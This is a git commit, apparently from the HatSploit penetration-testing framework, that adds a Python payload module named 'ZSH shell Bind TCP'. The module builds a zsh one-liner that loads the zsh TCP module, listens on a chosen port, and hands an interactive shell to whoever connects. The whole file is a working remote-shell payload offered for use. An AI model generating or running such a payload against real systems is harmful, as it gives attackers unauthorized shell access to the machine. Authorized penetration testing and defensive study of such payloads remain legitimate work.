4cb9fe3ce95d7f926cfab4025437b6424f3a6b09
Ivan Nikolsky <enty8080@gmail.com>
2022-02-19 23:24:58 +0300

    Create zsh_bind_tcp.py

---
+++ hatsploit/payloads/unix/generic/zsh_bind_tcp.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+
+#
+# This payload requires HatSploit: https://hatsploit.netlify.app
+# Current source: https://github.com/EntySec/HatSploit
+#
+
+from hatsploit.lib.payload import Payload
+
+
+class HatSploitPayload(Payload):
+    details = {
+        'Category': "single",
+        'Name': "ZSH shell Bind TCP",
+        'Payload': "unix/generic/zsh_bind_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080) - payload developer'
+        ],
+        'Description': "ZSH shell bind TCP payload.",
+        'Architecture': "generic",
+        'Platform': "unix",
+        'Rank': "high",
+        'Type': "bind_tcp"
+    }
+
+    def run(self):
+        remote_port = self.handler['BPORT']
+
+        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp -l {remote_port} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+        return payload
